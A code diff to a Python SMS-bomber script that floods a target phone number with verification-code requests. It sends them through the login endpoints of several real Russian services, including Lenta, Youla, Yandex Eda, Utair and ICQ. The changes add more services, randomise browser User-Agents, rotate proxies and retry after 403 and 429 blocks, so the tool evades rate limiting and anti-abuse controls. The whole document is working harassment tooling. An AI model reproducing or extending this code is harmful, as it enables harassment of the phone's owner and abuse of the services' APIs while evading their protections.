@@ -3,32 +3,53 @@ import time
 import argparse
 import random
 from concurrent.futures import ThreadPoolExecutor
+from fake_useragent import UserAgent
+
+ua = UserAgent()
 
 WORKING_APIS = {
-    "DNS": {
+    "DNS_Old": {
         "url": "https://www.dns-shop.ru/auth/auth/fast-authorization/",
         "method": "POST",
-        "data": {"phone": "{phone}"},
-        "headers": {
-            "Origin": "https://www.dns-shop.ru",
-            "Referer": "https://www.dns-shop.ru/"
-        }
+        "data": {"FastAuthorizationLoginLoadForm[login]": "{phone}"},
+        "headers": {"Origin": "https://www.dns-shop.ru", "Referer": "https://www.dns-shop.ru/"}
     },
     "Utair": {
         "url": "https://b.utair.ru/api/v1/login/",
         "method": "POST",
         "data": {"login": "{phone}"},
-        "headers": {
-            "Origin": "https://www.utair.ru",
-            "Referer": "https://www.utair.ru/"
+        "headers": {"Origin": "https://www.utair.ru", "Referer": "https://www.utair.ru/"}
+    },
+    "Lenta": {
+        "url": "https://lenta.com/api/v1/authentication/requestValidationCode",
+        "method": "POST",
+        "json": {"phone": "+{phone}"},
+        "headers": {"Origin": "https://lenta.com", "Referer": "https://lenta.com/"}
+    },
+    "Youla": {
+        "url": "https://youla.ru/web-api/auth/request_code",
+        "method": "POST",
+        "data": {"phone": "{phone}"},
+        "headers": {"Origin": "https://youla.ru", "Referer": "https://youla.ru/"}
+    },
+    "Yandex_Eda": {
+        "url": "https://eda.yandex/api/v1/user/request_authentication_code",
+        "method": "POST",
+        "json": {"phone_number": "+{phone}"},
+        "headers": {"Origin": "https://eda.yandex", "Referer": "https://eda.yandex/"}
+    },
+    "ICQ": {
+        "url": "https://u.icq.net/api/v90/smsreg/requestPhoneValidation.php",
+        "method": "POST",
+        "data": {
+            "msisdn": "+{phone}",
+            "locale": "en",
+            "countryCode": "ru",
+            "version": "1",
+            "k": "ic1rtwz1s1Hj1O0r",
+            "r": "46763"
         }
     }
-}
-
-BASE_HEADERS = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Accept": "application/json, text/plain, */*",
-    "Content-Type": "application/x-www-form-urlencoded"
 }
 
 def load_working_proxies(filename="working_proxies.txt"):
@@ -41,15 +62,26 @@ def load_working_proxies(filename="working_proxies.txt"):
 
 def send_sms(service_name, api_data, phone, proxy_pool):
     url = api_data["url"]
-    data = {}
-    for k, v in api_data.get("data", {}).items():
-        data[k] = v.replace("{phone}", phone) if isinstance(v, str) else v
+    method = api_data.get("method", "POST")
     
-    headers = BASE_HEADERS.copy()
+    data = {}
+    if "data" in api_data:
+        for k, v in api_data["data"].items():
+            data[k] = v.replace("{phone}", phone) if isinstance(v, str) else v
+            
+    json_data = {}
+    if "json" in api_data:
+        for k, v in api_data["json"].items():
+            json_data[k] = v.replace("{phone}", phone) if isinstance(v, str) else v
+
+    headers = {
+        "User-Agent": ua.random,
+        "Accept": "application/json, text/plain, */*"
+    }
     headers.update(api_data.get("headers", {}))
 
     attempts = 0
-    max_attempts = 5
+    max_attempts = 3
     success = False
 
     while attempts < max_attempts and not success:
@@ -57,19 +89,23 @@ def send_sms(service_name, api_data, phone, proxy_pool):
         proxy = None
         proxy_str = "Direct"
         
-        if proxy_pool and attempts <= 3:
+        if proxy_pool and attempts <= 2:
             p = random.choice(proxy_pool)
             proxy_str = p
             proxy = {"http": f"http://{p}", "https": f"http://{p}"}
 
         try:
-            r = requests.post(url, data=data, headers=headers, proxies=proxy, timeout=8)
+            if method == "POST":
+                if json_data:
+                    r = requests.post(url, json=json_data, headers=headers, proxies=proxy, timeout=8)
+                else:
+                    r = requests.post(url, data=data, headers=headers, proxies=proxy, timeout=8)
             
-            if r.status_code in [200, 201, 204]:
+            if r.status_code in [200, 201, 202, 204]:
                 print(f"[+] OK: {service_name} ({r.status_code}) | Proxy: {proxy_str}")
                 success = True
-            elif r.status_code == 403:
-                print(f"[-] BLOCKED 403: {service_name} | Proxy: {proxy_str}. Changing proxy...")
+            elif r.status_code in [403, 429]:
+                print(f"[-] BLOCKED {r.status_code}: {service_name} | Proxy: {proxy_str}. Retrying...")
             else:
                 print(f"[-] FAIL: {service_name} ({r.status_code}) | Proxy: {proxy_str}")
                 success = True
@@ -78,7 +114,7 @@ def send_sms(service_name, api_data, phone, proxy_pool):
             print(f"[!] ERR: {service_name} - {type(e).__name__} | Proxy: {proxy_str}")
 
     if not success:
-        print(f"[X] Could not send {service_name} after {max_attempts} attempts.")
+        print(f"[X] Could not send {service_name}.")
 
 def main():
     parser = argparse.ArgumentParser()
@@ -87,6 +123,9 @@ def main():
     args = parser.parse_args()
 
     phone = args.phone
+    if phone.startswith("+"):
+        phone = phone[1:]
+
     proxy_pool = load_working_proxies()
 
     print(f"\n[*] Target: {phone}")
